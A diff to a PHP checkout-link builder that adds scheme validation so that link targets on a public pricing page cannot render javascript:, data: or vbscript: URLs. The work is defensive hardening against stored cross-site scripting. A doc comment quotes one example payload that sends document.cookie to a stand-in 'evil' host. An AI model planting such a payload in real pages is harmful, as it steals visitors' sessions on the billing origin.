@@ -26,10 +26,57 @@ use App\Billing\Storefront\Contracts\BuildsCheckoutLinks;
  *
  * A target containing any `{...}` placeholder has them substituted (URL-encoded); a target with
  * none gets the params appended as a query string (merged with any it already carries).
+ *
+ * SCHEME SAFETY. The built URL is rendered into an `href` on the PUBLIC, unauthenticated pricing
+ * table and its embed — and handed to the client renderer as JSON. Blade escapes HTML entities,
+ * but a scheme carries none: `javascript:fetch('//evil/'+document.cookie)` survives escaping
+ * intact and executes on the billing origin, which also serves the operator console and the
+ * hosted checkout. The write path validates the scheme, and {@see safeTarget()} re-checks here so
+ * a template that reached the database by any other route (an import, a seeder, a direct write)
+ * still cannot emit a dangerous href. An unsafe target falls back to the configured default
+ * rather than rendering — deny-by-default, same as every other step above.
  */
 readonly class CheckoutLinkBuilder implements BuildsCheckoutLinks
 {
+    /**
+     * The only schemes a CTA may address. Anything else — `javascript:`, `data:`, `vbscript:` —
+     * is refused. A relative target (no scheme) is allowed: it stays on this origin.
+     */
+    private const ALLOWED_SCHEMES = ['http', 'https'];
+
     public function __construct(private string $defaultCheckoutUrl) {}
+
+    /**
+     * Whether a CTA target is safe to render into an `href`. Relative targets pass; absolute ones
+     * must carry an allow-listed scheme. Shared with the write-path validator so the console
+     * refuses at save time with the same rule this enforces at render time.
+     */
+    public static function isSafeTarget(string $target): bool
+    {
+        $trimmed = trim($target);
+
+        if ($trimmed === '') {
+            return false;
+        }
+
+        // A scheme-relative URL (`//host/path`) inherits the page's scheme and is safe.
+        if (str_starts_with($trimmed, '//')) {
+            return true;
+        }
+
+        $scheme = parse_url($trimmed, PHP_URL_SCHEME);
+
+        if ($scheme === false) {
+            return false;
+        }
+
+        // No scheme at all — a path-relative target such as `/signup?plan={plan}`.
+        if ($scheme === null) {
+            return ! str_contains(explode('/', $trimmed)[0], ':');
+        }
+
+        return in_array(strtolower($scheme), self::ALLOWED_SCHEMES, true);
+    }
 
     /**
      * @param  array<string, string>  $attribution  Extra params (e.g. an A/B experiment's
@@ -83,8 +130,18 @@ readonly class CheckoutLinkBuilder implements BuildsCheckoutLinks
         return $target.$separator.http_build_query($params);
     }
 
+    /**
+     * The preferred target when it is both present AND scheme-safe, else the fallback. An unsafe
+     * template is dropped rather than sanitised: there is no meaningful "cleaned" form of
+     * `javascript:…`, and silently rendering a neutered version would hide the misconfiguration
+     * from the operator.
+     */
     private function firstNonEmpty(?string $preferred, string $fallback): string
     {
-        return $preferred !== null && trim($preferred) !== '' ? $preferred : $fallback;
+        if ($preferred !== null && trim($preferred) !== '' && self::isSafeTarget($preferred)) {
+            return $preferred;
+        }
+
+        return $fallback;
     }
 }
